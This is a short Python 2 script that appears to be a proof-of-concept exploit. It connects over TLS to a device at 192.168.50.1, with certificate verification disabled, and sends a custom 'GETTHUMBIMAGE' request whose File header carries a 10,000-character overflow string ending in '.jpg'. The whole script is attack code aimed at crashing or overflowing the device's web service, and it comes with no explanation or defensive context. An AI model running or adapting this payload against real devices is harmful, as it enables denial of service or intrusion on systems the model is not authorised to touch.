#!/usr/bin/env python
from socket import *
import ssl


host='192.168.50.1'
port=443


sock_=socket(AF_INET,SOCK_STREAM)
sock = ssl.wrap_socket(sock_,ca_certs="server.crt",cert_reqs=ssl.CERT_NONE)
sock.connect((host,port))
sock.settimeout(2)


v='a'*10000 + '.jpg'
s='GETTHUMBIMAGE /favicon.ico HTTP/1.1\r\n'
s+='File: %s\r\n' % v
s+='Host: %s\r\n' % host
s+='User-Agent: Mozilla\r\n'
s+='\r\n'
sock.write(s)
s=sock.read()
print  s

